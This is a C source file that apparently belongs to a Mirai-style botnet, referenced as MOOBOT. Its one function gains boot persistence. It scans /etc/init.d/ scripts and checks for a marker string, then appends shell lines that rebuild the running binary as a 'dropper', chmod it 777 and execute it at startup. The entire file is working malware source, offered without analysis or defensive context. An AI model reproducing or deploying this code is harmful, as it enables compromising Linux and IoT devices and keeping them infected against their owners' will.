#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>

#include "utils.h"
#include "defines.h"
#include "startup.h"

void startup_load_proc(void)
{
    DIR *dir;
    char path[64], **paths;
    int files = 0, i, x;

    if ((dir = opendir("/etc/init.d/")) == NULL)
    {
#ifdef DEBUG
    	printf("[startup] - failed to open directory /etc/init.d/\r\n");
#endif
        return;
    }
#ifdef DEBUG
	printf("[startup] - attempting to gain persistance\r\n");
#endif

    paths = (char **)malloc((files + 1) * sizeof(*paths));

    while (TRUE)
    {
        struct dirent *file;
        int file_len;

    	if ((file = readdir(dir)) == NULL)
        {
            memset(path, 0, sizeof(path));
            closedir(dir);
            break;
        }
  	
        if (*(file->d_name) == '.')
        	continue;

        file_len = strlen(file->d_name);
        paths = (char **)realloc(paths, (files + 1) * sizeof(*paths));

        paths[files] = (char *)malloc(file_len + 13); // + 13 for /etc/init.d/ + \0
        memset(paths[files], 0, sizeof(paths[files]));
        memcpy(paths[files], "/etc/init.d/", 12);
        memcpy(paths[files] + 12, file->d_name, file_len);
       	memcpy(paths[files] + 12 + file_len, "\0", 1);
        files++;
    }

    

    for (i = 0; i < files - 1; i++) 
    {
    	uint8_t exists;
    	int fd_rd, fd_wr;
    	char rdbuf[512];

    	if ((fd_rd = open(paths[i], O_RDONLY)) <= 0)
    		continue;

    	memset(rdbuf, 0, sizeof(rdbuf));

    	while (read(fd_rd, rdbuf, sizeof(rdbuf)) >= 1)
    	{
    		if (utils_exists(rdbuf, strlen(rdbuf), "JnL3RGHoBknNq2W1LSB7", 20) == 1)
    		{
        #ifdef DEBUG
				printf("[startup] - we already have persistance on this device\r\n");
        #endif
    			for (x = 0; x < files; x++)
        			free(paths[x]);

    			free(paths);
    			close(fd_rd);
    			return;
    		}

    		memset(rdbuf, 0, sizeof(rdbuf));
    	}

    	close(fd_rd);

    	while (TRUE)
    	{
    		uint8_t byte;
    		int fd_exe, ctr = 0;
    		char val[8], payload[(STARTUP_BYTES_PER_LINE * 4) + 32]; // 32 for extra padding to be safe

    		if ((fd_exe = open("/proc/self/exe", O_RDONLY)) <= 0)
    			break;

    		if ((fd_wr = open(paths[i], O_WRONLY|O_APPEND)) <= 0)
    		{
    			close(fd_exe);
    			break;
    		}

    		memset(payload, 0, sizeof(payload));

    		while (TRUE)
    		{
	    		for (x = 0; x < STARTUP_BYTES_PER_LINE; x++)
	    		{
	    			if (read(fd_exe, &byte, sizeof(uint8_t)) != 1)
	    				break;

	    			memset(val, 0, sizeof(val));
	    			utils_btohd(&byte, 1, val);
	    			memcpy(payload + (ctr * 4), val, 4);
	    			ctr++;
	    		}
            #ifdef MOOBOT_STARTUP
	    		write(fd_wr, "\r\n", 2);
	    		write(fd_wr, "echo -ne \"", 10);
	    		write(fd_wr, payload, STARTUP_BYTES_PER_LINE * 4);
	    		write(fd_wr, "\" >> dropper", 12);
            #endif
	    		ctr = 0;

	    		if (x != STARTUP_BYTES_PER_LINE)
	    			break;
    		}
        #ifdef DEBUG
			printf("[startup] - payload bound to file %s\r\n", paths[i]);
        #endif
			write(fd_wr, "\r\n", 2);
			write(fd_wr, "chmod 777 dropper", 17);
			write(fd_wr, "\r\n", 2);
			write(fd_wr, "./dropper startup", 17);
			write(fd_wr, "\r\n", 2);
			write(fd_wr, "JnL3RGHoBknNq2W1LSB7", 20);
			write(fd_wr, "\r\n", 2);
			close(fd_wr);
			close(fd_exe);

    		for (x = 0; x < files; x++)
        		free(paths[x]);

    		free(paths);
    		return;
    	}
    }

    for (x = 0; x < files; x++)
        free(paths[x]);

    free(paths);
    return;
}
